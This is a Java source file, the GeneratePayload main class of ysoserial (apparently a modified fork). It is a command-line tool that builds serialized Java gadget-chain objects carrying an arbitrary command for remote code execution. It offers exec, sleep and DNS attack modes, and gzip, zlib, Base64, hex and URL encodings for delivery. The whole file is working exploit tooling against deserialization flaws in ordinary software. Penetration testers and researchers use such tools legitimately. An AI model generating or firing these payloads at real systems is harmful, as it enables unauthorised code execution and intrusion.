package ysoserial;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.URLEncoder;
import java.util.*;
import java.util.zip.DeflaterOutputStream;
import java.util.zip.GZIPOutputStream;

import org.apache.commons.codec.binary.Base64;
import org.apache.commons.codec.binary.Hex;

import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.ObjectPayload.Utils;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;

@SuppressWarnings("rawtypes")
public class GeneratePayload {
	private static final int INTERNAL_ERROR_CODE = 70;
	private static final int USAGE_CODE = 64;

	public static void main(final String[] args) {
		if (args.length < 2) {
			printUsage();
			System.exit(USAGE_CODE);
		}
		
		// Default to exec_global, to maintain compatibility with script that requires ysoserial
		String attackType = "exec_global";
		if (args.length >= 3) {
			attackType = args[2];
		}
		
		String[] payloadTransformations = null;
		if (args.length >= 4) {
			payloadTransformations = args[3].split(",");
		}
		
		final String payloadType = args[0];
		final String command = args[1];

		final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
		if (payloadClass == null) {
			System.err.println("Invalid payload type '" + payloadType + "'");
			printUsage();
			System.exit(USAGE_CODE);
			return; // make null analysis happy
		}

		try {
			final ObjectPayload payload = payloadClass.newInstance();
			final Object object = payload.getObject(command, attackType);
			PrintStream out = System.out;
			
			byte[] serializedObjectBytes = Serializer.serialize(object);
			
			byte[] transformedObjectBytes = serializedObjectBytes;
			if(payloadTransformations != null) {
			
				for(String s : payloadTransformations) {
				
					transformedObjectBytes = Transformation.valueOf(s.toUpperCase().trim()).transform(transformedObjectBytes);
										
				}
			
			}
									
			out.write(transformedObjectBytes);
			out.flush();
			out.close();
			
			ObjectPayload.Utils.releasePayload(payload, object);
		} catch (Throwable e) {
			System.err.println("Error while generating or serializing payload");
			e.printStackTrace();
			System.exit(INTERNAL_ERROR_CODE);
		}
		System.exit(0);
	}

	private static void printUsage() {
		System.err.println("Y SO SERIAL?");
		System.err.println("Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]' [attack_type]");
		System.err.println("  Available payload types:");

		final List<Class<? extends ObjectPayload>> payloadClasses =
			new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
		Collections.sort(payloadClasses, new Strings.ToStringComparator()); // alphabetize

        final List<String[]> rows = new LinkedList<String[]>();
        rows.add(new String[] {"Payload", "Authors", "Dependencies"});
        rows.add(new String[] {"-------", "-------", "------------"});
        for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
             rows.add(new String[] {
                payloadClass.getSimpleName(),
                Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
                Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)),", ", "", "")
            });
        }

        final List<String> lines = Strings.formatTable(rows);

        for (String line : lines) {
            System.err.println("     " + line);
        }
        
        System.err.println("\tAvailable payload types:");
		System.err.println("\t\texec_global");
		System.err.println("\t\texec_win");
		System.err.println("\t\texec_unix");
		System.err.println("\t\tsleep");
		System.err.println("\t\tdns");
    }
	
    private enum Transformation {
        GZIP {
            public String toString() { return "Compress using gzip"; }
            protected OutputStream getCompressor(OutputStream os) throws IOException {
                return new GZIPOutputStream(os);
            }
        },
        ZLIB {
            public String toString() { return "Compress using zlib"; }
            protected OutputStream getCompressor(OutputStream os) throws IOException {
                return new DeflaterOutputStream(os);
            }
        },
        BASE64 {
            public String toString() { return "Encode using Base64"; }
            public byte[] transform(byte[] input) throws IOException { return Base64.encodeBase64(input); }
        },
        BASE64_URL_SAFE {
            public String toString() { return "Encode using URL-safe Base64"; }
            public byte[] transform(byte[] input) throws IOException { return Base64.encodeBase64URLSafe(input); }
        },
        ASCII_HEX {
            public String toString() { return "Encode using ASCII hex"; }
            public byte[] transform(byte[] input) throws IOException { return hex.encode(input); }
			private Hex hex = new Hex("ASCII");
        },
        URL_ENCODING {
            public String toString() { return "Encode using URL encoding"; }
            public byte[] transform(byte[] input) throws IOException {
                return URLEncoder.encode(new String(input, "ISO-8859-1"), "ISO-8859-1").getBytes();
            }
        };

        protected OutputStream getCompressor(OutputStream os) throws IOException { return null; }
        public byte[] transform(byte[] input) throws IOException {
            ByteArrayOutputStream outbytes = new ByteArrayOutputStream(input.length);
            OutputStream comp = getCompressor(outbytes);
            comp.write(input);
            comp.close();
            return outbytes.toByteArray();
        }
    }
    
}
